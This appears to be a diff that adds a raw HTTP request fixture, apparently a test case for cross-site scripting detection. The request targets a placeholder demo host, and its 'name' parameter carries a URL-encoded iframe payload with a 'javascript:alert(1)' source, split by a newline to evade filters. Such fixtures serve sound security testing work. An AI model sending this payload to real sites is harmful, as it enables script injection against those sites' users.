@@ -1,0 +1,4 @@
+GET /a?name=<iframe%0asrc%3D"javascript:alert(1)"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
